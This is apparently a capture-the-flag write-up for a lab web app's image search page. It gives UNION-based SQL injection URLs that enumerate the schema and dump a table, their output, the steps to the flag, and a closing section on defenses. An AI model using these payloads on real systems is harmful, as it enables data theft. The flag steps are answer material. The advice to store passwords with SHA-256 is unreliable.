# Searching Page

__http://192.168.99.101/?page=searchimg&Submit=Submit__

## Description
This is a page for searching over the images. 

## Form Outputs
we can select for table names as in previous task [select table_name, 0 from information_schema.tables where table_schema=database()](#http://192.168.99.101/?page=searchimg&id=-1%20union%20select%20table_name,%200%20from%20information_schema.tables%20where%20table_schema=database()&Submit=Submit)
```
ID: -1 union select table_name, 0 from information_schema.tables where table_schema=database() 
Title: 0
Url : list_images
```
we can select for column names as in previous task [select column_name, column_type from information_schema.columns where table_schema=database()](#http://192.168.99.101/?page=searchimg&id=-1%20union%20select%20column_name,%20column_type%20from%20information_schema.columns%20where%20table_schema=database()&Submit=Submit)
```
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: int(11)
Url : id
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(40)
Url : url
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(25)
Url : title
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(255)
Url : comment
```
we can select sensetive data as in previous task [select title, comment from list_images](#http://192.168.99.101/?page=searchimg&id=-1%20union%20select%20title,%20comment%20from%20list_images&Submit=Submit)
```
ID: -1 union select title, comment from list_images 
Title: An image about the NSA !
Url : Nsa
ID: -1 union select title, comment from list_images 
Title: There is a number..
Url : 42 !
ID: -1 union select title, comment from list_images 
Title: Google it !
Url : Google
ID: -1 union select title, comment from list_images 
Title: Earth!
Url : Earth
ID: -1 union select title, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

## Flag
The flag we've got in MD5 hash [1928e8083cf461a51303633093573c46](#https://md5.gromweb.com/?md5=1928e8083cf461a51303633093573c46)
Then we request albatroz name in 256 as in instruction 
```echo -n "albatroz" | shasum -a 256```


## Safety
When it comes to web development safety, there are a few key takeaways from this information: </br>
1. Input Validation: It is crucial to properly validate and sanitize user input, especially when it is used in database queries. The vulnerabilities demonstrated in the examples show how an attacker can manipulate the SQL queries by injecting malicious SQL code, resulting in unauthorized access to sensitive information.
2. Query Security: Use prepared statements or parameterized queries instead of directly concatenating user input into SQL statements. This helps prevent SQL injection attacks by separating the SQL code from user-supplied data.
3. Access Control: Ensure that users have appropriate access rights and privileges to perform actions on the website. Restrict access to sensitive data and functionality, and implement proper authentication and authorization mechanisms.
4. Secure Hashing: When storing passwords or sensitive information, use strong hashing algorithms like SHA-256. MD5 is considered weak and should not be used for security purposes.
5. Error Handling: Implement proper error handling mechanisms to avoid exposing sensitive information to the user in error messages or logs. Provide generic error messages to users and log detailed error information securely for internal debugging.
6. Secure Coding Practices: Follow secure coding practices, such as input validation, output encoding, and session management, to prevent common vulnerabilities like cross-site scripting (XSS) attacks and cross-site request forgery (CSRF) attacks.
